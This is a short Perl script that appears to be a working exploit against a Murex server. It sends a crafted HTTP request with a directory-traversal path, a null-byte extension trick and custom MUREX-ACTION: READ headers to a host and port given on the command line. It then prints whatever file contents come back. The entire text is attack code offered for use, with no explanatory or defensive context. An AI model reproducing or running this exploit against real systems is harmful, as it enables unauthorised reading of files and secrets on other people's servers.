#!/usr/bin/perl

use strict;
use warnings;
use IO::Socket::INET;

my $payload = "GET /../../../../../../../..$ARGV[0]\0.mxres HTTP/1.1\r\nMUREX-EXTENSION: *\r\nMUREX-ACTION: READ\r\n";
$payload.="content-type: application/zip\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n";
$payload.="User-Agent: Java/1.6.0_24\r\nHost: $ARGV[1]:$ARGV[2]\r\n";
$payload.="Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\r\nConnection: Close\r\n\r\n";
my $sock = IO::Socket::INET->new("$ARGV[1]:$ARGV[2]") or die "Unable to connect to server: $!\n";
print $sock $payload;
while (<$sock>) {
  print $_;
}
close ($sock);
